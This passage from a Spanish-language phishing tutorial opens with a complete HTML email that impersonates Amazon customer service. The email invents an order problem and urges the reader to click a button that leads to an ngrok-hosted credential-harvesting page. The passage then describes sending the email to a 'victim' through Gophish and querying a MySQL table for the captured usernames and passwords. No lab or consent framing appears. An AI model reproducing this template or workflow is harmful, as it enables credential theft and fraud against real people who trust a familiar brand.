}

body {
font-family: Verdana, Geneva, Thaoma, sans-serif;
color: black;
}
	</style>
</head>
<body>
<hr class="line_head" />
<p><img src="https://www.sosgats.org/wp-content/uploads/2017/01/logo-amazon.jpg" width="300" /></p>

<hr class="line" />
<p>Estimado/a cliente,<br />
<br />
Lamentamos informarle que ha habido un problema con uno de sus pedidos recientes en Amazon. Para resolver este problema y asegurarnos de que reciba su pedido a tiempo, necesitamos que confirme algunos detalles de su cuenta.<br />
<br />
Si no resuelve este problema, es posible que su pedido se retrase o sea cancelado. Agradecemos su pronta atenci&oacute;n a este asunto.<br />
<br />
Si tiene alguna pregunta o necesita asistencia adiccional, no dude en contactarnos a traves de nuestro servicio de atenci&oacute;n al cliente.<br />
<br />
Atentamente,<br />
<br />
Equipo de Atenci&oacute;n al Cliente Amazon.</p>

<p><a href="https://9b19-90-169-44-222.ngrok-free.app/index.php"><input class="input_letter" style="background-color: orange; border: none; border-radius: 3px; padding: 15px 32px;" type="submit" value="Seguimiento de tu pedido" /></a></p>

<div class="box"><span class="letter">Si en el futuro prefieres no recibir correos electr&oacute;nicos de Amazon de este tipo, selecciona la exluci&oacute;n voluntaria <a href="https://9b19-90-169-44-222.ngrok-free.app/index.php">aqu&iacute;</a></span><br />
<br />
<span class="letter">Referencia AKDFGD27DKIEHFU6-JDLJDJS423ILFPBNGS Amazon EU Sarl. Luxemburgo, Reg# B-1810102, 5 Rue Plaetis, L-23824 Luxemburgo. VAT # LU 2026781.</span><br />
&nbsp;
<p><img src="https://niveldecalidad.com/wp-content/uploads/2022/09/PAGINA_AMAZON_2-02.png" width="100" /></p>
</div>
</body>
</html>
```

Lo guardamos y ya podremos enviarlo al usuario victima de la siguiente manera...

Volvemos por donde lo dejamos en la herramienta `Gophish` en la zona de `Campaigns` dejando la configuracion que mencione anteriormente y estando en la parte de `Send Email` pondremos el `email` del usuario victima y le daremos al boton de `Send` una vez hecho esto, ya le habria llegado al usuario y solo seria cuestion de esperar...

Si el usuario hubiera picado y hubiera introducido las credenciales en la pagina del login `phishing` lo veremos de la siguiente manera llendo a `mysql` y haciendo lo siguiente...

```shell
mysql -h localhost -u root -proot
```

```mysql
USE phishing_db;
```

```mysql
SELECT * FROM credentials;
```

Info:

```
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | admin    | root     |
+----+----------+----------+
1 row in set (0.020 sec)
```

Y como veremos las credenciales fueron registradas perfectamente...
